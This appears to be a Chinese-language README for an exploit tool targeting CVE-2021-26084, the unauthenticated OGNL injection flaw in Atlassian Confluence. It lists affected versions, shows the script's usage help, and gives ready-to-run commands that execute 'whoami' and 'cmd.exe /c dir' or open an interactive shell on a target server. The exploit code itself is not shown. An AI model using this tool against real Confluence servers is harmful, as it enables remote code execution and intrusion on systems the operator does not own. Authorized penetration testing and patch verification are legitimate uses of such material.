# CVE-2021-26084

## 来源

[https://github.com/r0ckysec/CVE-2021-26084_Confluence](https://github.com/r0ckysec/CVE-2021-26084_Confluence)

## 介绍

Atlassian Confluence是Atlassian公司出品的专业wiki程序。它可以作为一个知识管理的工具，通过它能够实现团队成员之间的协作和知识共享。

远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式进行注入，实现在 Confluence Server或Data Center上执行任意代码

## 影响范围

Atlassian Confluence Server/Data Center < 6.13.23

Atlassian Confluence Server/Data Center < 7.4.11

Atlassian Confluence Server/Data Center < 7.11.6

Atlassian Confluence Server/Data Center < 7.12.5

Atlassian Confluence Server/Data Center < 7.13.0

## 使用方法

- ```
  usage: cve-2021-26084_confluence_rce.py [-h] --url URL [--cmd CMD] [--shell]
  
  CVE-2021-26084 - Confluence Pre-Auth RCE OGNL injection
  
  optional arguments:
    -h, --help         show this help message and exit
    --url URL, -u URL  Target Url
    --cmd CMD, -c CMD  Command
    --shell            Get shell
  ```

- ```
  python3 cve-2021-26084_confluence_rce.py -u http://target:8090 -c "whoami"
  ```

  ![1630484082986](img/1630484082986.png)

- ```
  python3 cve-2021-26084_confluence_rce.py -u http://target:8090 -c "cmd.exe /c dir"
  ```

  ![1630484112292](img/1630484112292.png)

### GetShsell

```
python3 cve-2021-26084_confluence_rce.py -u http://target:8090 --shell
```

![1630490483870](img/1630490483870.png)

![1630490401164](img/1630490401164.png)

## Reference:

https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md